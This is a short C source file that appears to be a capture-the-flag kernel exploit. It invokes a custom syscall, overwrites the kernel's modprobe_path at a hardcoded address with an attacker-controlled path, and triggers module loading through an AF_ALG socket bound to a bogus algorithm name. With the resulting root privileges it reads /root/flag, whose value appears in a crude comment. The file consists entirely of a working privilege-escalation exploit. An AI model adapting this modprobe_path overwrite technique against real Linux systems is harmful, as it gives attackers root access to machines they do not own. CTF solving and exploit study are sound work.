#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <unistd.h>

typedef unsigned short __u16;
typedef unsigned char __u8;
typedef unsigned int __u32;

struct sockaddr_alg {
  __u16 salg_family;
  __u8 salg_type[14];
  __u32 salg_feat;
  __u32 salg_mask;
  __u8 salg_name[64];
};

int main(void) {
  if (chmod("/root", 0777) == 0 && chmod("/root/flag", 0777) == 0) {
    return 0;
  }
  long res = syscall(468, 0x2001070, 2);
  if (res) {
    printf("syscall(468) errno %d\n", errno);
  }
  char *modprobe_path = (char *)0xffff888001cc3aa0;
  printf("%s\n", modprobe_path);
  strcpy(modprobe_path, "/home/user/pwnit");

  struct sockaddr_alg sa;
  int alg_fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
  if (alg_fd < 0) {
    perror("socket(AF_ALG) failed");
    return 1;
  }
  memset(&sa, 0, sizeof(sa));
  sa.salg_family = AF_ALG;
  strcpy((char *)sa.salg_type, "V4bel"); // dummy string
  bind(alg_fd, (struct sockaddr *)&sa, sizeof(sa));
  system("cat /root/flag"); // midnight{big_dick_b0bby_boy_is_b4ck}
}
